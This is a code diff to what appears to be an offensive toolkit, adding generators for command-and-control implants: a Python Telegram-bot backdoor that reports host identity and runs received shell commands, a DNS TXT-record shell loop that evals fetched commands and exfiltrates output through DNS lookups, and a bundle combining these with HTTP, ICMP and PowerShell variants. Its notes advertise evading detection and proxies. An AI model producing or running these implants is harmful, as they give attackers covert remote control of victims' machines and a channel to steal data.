@@ -241,3 +241,51 @@ Example encoding in bash:
   key=78  # 0x4e
   python3 -c "import base64,sys; d=sys.argv[1].encode(); print(base64.b64encode(bytes(b^${"\${key}"} for b in d)).decode())" "$cmd"`;
 }
+
+export function buildTelegramC2(botToken: string, chatId: string): C2PollerBundle {
+  const py = `python3 -c "
+import os,time,subprocess,urllib.request,urllib.parse,json
+BOT='${botToken}'; CHAT='${chatId}'; API=f'https://api.telegram.org/bot{BOT}'
+last=0
+def send(txt):
+  try: urllib.request.urlopen(urllib.request.Request(f'{API}/sendMessage',data=json.dumps({'chat_id':CHAT,'text':txt[:4096]}).encode(),headers={'Content-Type':'application/json'}),timeout=5)
+  except: pass
+send('NX_CONNECT\\nhost:'+os.popen('hostname').read().strip()+'\\nid:'+os.popen('id').read().strip())
+while True:
+  try:
+    r=urllib.request.urlopen(f'{API}/getUpdates?offset={last+1}&timeout=60',timeout=65)
+    for u in json.loads(r.read()).get('result',[]):
+      last=u['update_id']
+      cmd=u.get('message',{}).get('text','')
+      if cmd.startswith('/nx '):
+        try: out=subprocess.check_output(cmd[4:],shell=True,stderr=subprocess.STDOUT,timeout=30).decode(errors='replace')[:4000]
+        except Exception as e: out=str(e)
+        send(out)
+  except: time.sleep(30)
+" 2>/dev/null &`;
+  return { id:"telegram_c2", name:"Telegram Bot C2", kind:"polling", command:py, notes:"C2 via Telegram bot API. /nx prefix commands. Port 443 HTTPS to Telegram — rarely blocked. Indistinguishable from Telegram bot traffic." };
+}
+
+export function buildDnsTxtC2(domain: string): C2PollerBundle {
+  const sh = `while true; do
+_SEQ=$(dig +short TXT "seq.${domain}" @8.8.8.8 2>/dev/null|tr -d '"')
+_CMD=$(dig +short TXT "cmd\${_SEQ:-0}.${domain}" @8.8.8.8 2>/dev/null|tr -d '"'|base64 -d 2>/dev/null)
+if [ -n "$_CMD" ]; then
+  _OUT=$(eval "$_CMD" 2>&1|base64 -w0|head -c400)
+  dig TXT "r\${_SEQ:-0}.\${_OUT}.${domain}" @8.8.8.8 2>/dev/null
+fi
+sleep 60
+done &`;
+  return { id:"dns_txt_c2", name:"DNS TXT Record C2", kind:"polling", command:sh, notes:"Pure DNS C2 — polls cmd*.domain TXT records every 60s. Exfil response via DNS lookups. Works through all web proxies. Port 53 UDP only." };
+}
+
+export function buildC2PollerBundle(lhost: string, lport: string, cbUrl: string): C2PollerBundle[] {
+  const domain = oobHost(cbUrl);
+  return [
+    buildHttpPollerC2(lhost, lport, cbUrl),
+    buildIcmpC2(lhost, lport),
+    buildWindowsPowerShellC2(lhost, lport, cbUrl),
+    buildTelegramC2("BOT_TOKEN", "CHAT_ID"),
+    buildDnsTxtC2(domain),
+  ];
+}
